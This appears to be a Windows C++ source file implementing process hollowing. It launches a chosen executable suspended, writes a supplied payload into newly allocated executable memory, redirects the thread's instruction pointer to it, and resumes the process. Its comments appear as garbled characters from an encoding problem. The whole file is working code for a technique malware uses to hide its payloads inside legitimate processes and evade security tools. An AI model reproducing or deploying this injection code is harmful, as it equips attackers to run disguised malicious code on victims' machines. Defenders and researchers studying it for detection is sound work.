#include "stdafx.h"
#include "ReplaceProcess.h"


void ShowError(char *pszText)
{
	char szErr[MAX_PATH] = {0};
	::wsprintf(szErr, "%s Error[%d]\n", pszText, ::GetLastError());
	::MessageBox(NULL, szErr, "ERROR", MB_OK);
}


// �������̲��滻�����ڴ�����, ����ִ��˳��
BOOL ReplaceProcess(char *pszFilePath, PVOID pReplaceData, DWORD dwReplaceDataSize, DWORD dwRunOffset)
{
	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	CONTEXT threadContext = { 0 };
	BOOL bRet = FALSE;
	::RtlZeroMemory(&si, sizeof(si));
	::RtlZeroMemory(&pi, sizeof(pi));
	::RtlZeroMemory(&threadContext, sizeof(threadContext));
	si.cb = sizeof(si);
	// �������̲��������߳�
	bRet = ::CreateProcess(pszFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
	if (FALSE == bRet)
	{
		ShowError("CreateProcess");
		return FALSE;
	}
	// ��ȡ��ַ�ķ���: ��ʱcontext�е�EBX��ָ��PEB��ָ��, ����PEBƫ����8��λ�ô�� PEB_LDR_DATA �ĵ�ַ
	// ���ǿ��Ը��� PEB_LDR_DATA ��ȡ���̻�ַ�Լ�������������ȡ���н���
//	DWORD dwProcessBaseAddr = 0;
//	::ReadProcessMemory(pi.hProcess, (LPVOID)(8 + threadContext.Ebx), &dwProcessBaseAddr, sizeof(dwProcessBaseAddr), NULL);

	// ���滻�Ľ���������һ���ڴ�
	LPVOID lpDestBaseAddr = ::VirtualAllocEx(pi.hProcess, NULL, dwReplaceDataSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (NULL == lpDestBaseAddr)
	{
		ShowError("VirtualAllocEx");
		return FALSE;
	}
	// д���滻������
	bRet = ::WriteProcessMemory(pi.hProcess, lpDestBaseAddr, pReplaceData, dwReplaceDataSize, NULL);
	if (FALSE == bRet)
	{
		ShowError("WriteProcessError");
		return FALSE;
	}
	// ��ȡ�߳�������
	// ע��˴���־��һ��Ҫд!!!
	threadContext.ContextFlags = CONTEXT_FULL;
	bRet = ::GetThreadContext(pi.hThread, &threadContext);
	if (FALSE == bRet)
	{
		ShowError("GetThreadContext");
		return FALSE;
	}
	// �޸Ľ��̵�PE�ļ�����ڵ�ַ�Լ�ӳ���С,�Ȼ�ȡԭ������PE�ṹ�ļ��ػ�ַ
	threadContext.Eip = (DWORD)lpDestBaseAddr + dwRunOffset;
	// ���ù�����̵��߳�������
	bRet = ::SetThreadContext(pi.hThread, &threadContext);
	if (FALSE == bRet)
	{
		ShowError("SetThreadContext");
		return FALSE;
	}
	// �ָ�����Ľ��̵��߳�
	::ResumeThread(pi.hThread);

	return TRUE;
}